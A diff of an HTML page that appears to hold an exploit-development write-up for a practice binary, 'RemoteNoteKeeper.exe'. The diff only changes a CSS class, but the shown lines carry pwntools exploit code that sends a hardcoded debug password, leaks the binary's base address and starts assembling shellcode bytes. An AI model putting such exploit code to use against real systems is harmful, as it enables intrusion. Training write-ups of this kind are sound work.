@@ -338,7 +338,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"DEBUG exp301isfun"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"READ DEBUG"</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline_contains(</span><span class="no">b</span><span class="s">"RemoteNoteKeeper.exe"</span><span class="p">)[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">], </span><span class="mi">16</span><span class="p">)  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline_contains(</span><span class="no">b</span><span class="s">"RemoteNoteKeeper.exe"</span><span class="p">)[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">], </span><span class="mi">16</span><span class="p">)  
 log.info(</span><span class="no">f</span><span class="s">"Binary base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
@@ -494,7 +494,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"DEBUG exp301isfun"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"READ DEBUG"</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline_contains(</span><span class="no">b</span><span class="s">"RemoteNoteKeeper.exe"</span><span class="p">)[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">], </span><span class="mi">16</span><span class="p">)  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline_contains(</span><span class="no">b</span><span class="s">"RemoteNoteKeeper.exe"</span><span class="p">)[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">], </span><span class="mi">16</span><span class="p">)  
 
 shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\xcb\x6e\xb3\xbf\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
